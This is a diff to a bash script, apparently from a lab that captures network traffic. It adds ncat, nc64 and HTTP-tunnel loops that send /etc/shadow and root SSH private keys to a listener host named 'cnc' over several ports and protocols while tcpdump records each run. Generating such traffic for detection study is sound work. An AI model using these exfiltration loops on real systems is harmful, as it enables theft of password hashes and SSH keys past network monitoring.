@@ -5,6 +5,7 @@
 PCAP_DIR="/vagrant/pcap"
 SCRIPT_DIR="`pwd`/scripts"
 SLEEP_INTERVAL='1'
+NCAT_WAIT_INTERVAL='3'
 
 # Tail this file to verify that data is being transfered
 # --output or stdout of cnc listener should be redirected here
@@ -19,13 +20,14 @@ LISTENER_BOX='cnc'
 FILES=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
 PORTS=( '53' '22' '80' '443' )
 
-IP_PROTOCOLS=( 't' 'u' )
+IP_PROTOCOLS=( 'u' 't' )
 IP_VERSIONS=( '4' '6' )
 
 LISTENER_IP4='192.168.12.12'
 LISTENER_IP6='2a02:1010:12::12'
 
 TUN64_MODES=( 't6over4' 't6to4' 'isatap' )
+NC64_MODES=( '' '-b64' )
 
 # Common functions
 
@@ -69,6 +71,11 @@ kill_tcpdump_listener () {
 }
 
 send_files () {
+
+    if [[ $# -ne 3 ]]; then
+        die "Illegal number of arguments for reconfiguring ssh listener, must be 3"
+    fi
+
     LISTEN_CMD=$1
     KILL_CMD=$3
 
@@ -103,12 +110,12 @@ iterate_ssh_tunnels () {
             case $version in
                 4)
                 ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
-                LISTEN_DATA="ncat -4 -l -p 4444 -k -w 5 --output $LOGFILE"
+                LISTEN_DATA="ncat -4 -l -p 4444 -k -w $NCAT_WAIT_INTERVAL --output $LOGFILE"
                 SEND_DATA="ncat 127.0.0.1 4444"
                 ;;
                 6)
                 ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
-                LISTEN_DATA="ncat -6 -l -p 6666 -k -w 5 --output $LOGFILE"
+                LISTEN_DATA="ncat -6 -l -p 6666 -k -w $NCAT_WAIT_INTERVAL --output $LOGFILE"
                 SEND_DATA="ncat -6 ::1 6666"
                 ;;
                 *)
@@ -124,7 +131,7 @@ iterate_ssh_tunnels () {
             echo "$ITERATION_NAME"
         
             # Cleanup just in case
-            SSH $LISTENER_BOX "sudo pkill ncat"
+            SSH $LISTENER_BOX "$KILL_CMD"
             kill_tcpdump_listener
         
             reconfigure_ssh_listener add $port
@@ -136,7 +143,7 @@ iterate_ssh_tunnels () {
             send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
         
             echo "Cleaning up"
-            SSH $LISTENER_BOX "sudo pkill ncat"
+            SSH $LISTENER_BOX "$KILL_CMD"
             SSH $SENDER_BOX "sudo ps -ef | egrep 'ssh.+id_rsa' | awk -F \" \" '{ print \$2 }' | sudo xargs kill"
             reconfigure_ssh_listener remove $port
             kill_tcpdump_listener
@@ -177,17 +184,118 @@ reconfigure_ssh_listener () {
 
 }
 
+# Ncat tunneling
+
+iterate_ncat_tunnels () {
+    for protocol in "${IP_PROTOCOLS[@]}"; do
+        for port in "${PORTS[@]}"; do
+            for ver in "${IP_VERSIONS[@]}"; do
+                case $ver in
+                    4)
+                    dest_ip="$LISTENER_IP4"
+                    ;;
+                    6)
+                    dest_ip="$LISTENER_IP6"
+                    ;;
+                    *)
+                    die "No IP version (4|6) set for iterate_http_tunnels"
+                    ;;
+                esac
+                ITERATION_NAME="netcat-$protocol-$port-$ver"
+
+                LISTEN_DATA="ncat -$ver -$protocol -w $NCAT_WAIT_INTERVAL -lp $port --output=$LOGFILE"
+                SEND_DATA="ncat -w $NCAT_WAIT_INTERVAL $dest_ip -$protocol $port"
+
+                LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
+                SEND_CMD="$SEND_DATA"
+                KILL_CMD="sudo pkill ncat"
+
+                echo "$ITERATION_NAME"
+
+                start_tcpdump_listener eth1 "$ITERATION_NAME"
+
+                send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
+
+                kill_tcpdump_listener
+            done
+        done
+    done
+}
+
+# nc64 tunneling
+
+iterate_nc64_tunnels () {
+    IP_VERSIONS+=( '64' )
+    for protocol in "${IP_PROTOCOLS[@]}"; do
+        for port in "${PORTS[@]}"; do
+            for ver in "${IP_VERSIONS[@]}"; do
+                case $ver in
+                    4)
+                    nc64_args="--ip_version_select 4"
+                    ;;
+                    6)
+                    nc64_args="--ip_version_select 6"
+                    ;;
+                    *)
+                    nc64_args=""
+                    ;;
+                esac
+
+                for mode in "${NC64_MODES[@]}"; do
+                    nc64_args+=" $mode"
+                    ITERATION_NAME="nc64-$protocol-$port-$ver$mode"
+    
+                    LISTEN_DATA="/opt/nc64/nc64.py -i eth1 -l -$protocol -p $port $nc64_args"
+                    SEND_DATA="/opt/nc64/nc64.py -i eth1 -h4 $LISTENER_IP4 -h6 $LISTENER_IP6 -$protocol -p $port $nc64_args "
+    
+                    LISTEN_CMD="nohup sudo $LISTEN_DATA >> $LOGFILE & sleep 1"
+                    SEND_CMD="sudo $SEND_DATA"
+                    KILL_CMD="sudo pkill -9 nc64"
+
+                    echo "$ITERATION_NAME"
+    
+                    start_tcpdump_listener eth1 "$ITERATION_NAME"
+    
+                    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
+    
+                    kill_tcpdump_listener
+                done
+            done
+        done
+    done
+}
+
 # HTTP tunneling
 
-#iterate_http_tunnels {
-#    for port in "${PORTS[@]}"; do
-#        LISTEN_DATA="hts $port -s"
-#        SEND_DATA="htc -s LISTENER_IP4:$port"
-#
-#
-#
-#    done
-#}
+iterate_http_tunnels () {
+    for port in "${PORTS[@]}"; do
+        LISTEN_DATA="hts $port -s"
+        SEND_DATA="htc -s $LISTENER_IP4:$port"
+
+        ITERATION_NAME="http-$port"
+        LISTEN_CMD="nohup sudo $LISTEN_DATA >> $LOGFILE & sleep 1"
+        SEND_CMD="sudo $SEND_DATA"
+        KILL_CMD="sudo pkill htc"
+
+        echo "$ITERATION_NAME"
+
+        start_tcpdump_listener eth1 "$ITERATION_NAME"
+
+        send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
+
+        kill_tcpdump_listener
+        sleep $SLEEP_INTERVAL
+
+    done
+}
 
 # MAIN
-iterate_ssh_tunnels
+# This works
+#iterate_ssh_tunnels
+#iterate_ncat_tunnels
+#iterate_nc64_tunnels
+
+# This does not
+#iterate_http_tunnels
+
+# This is in dev
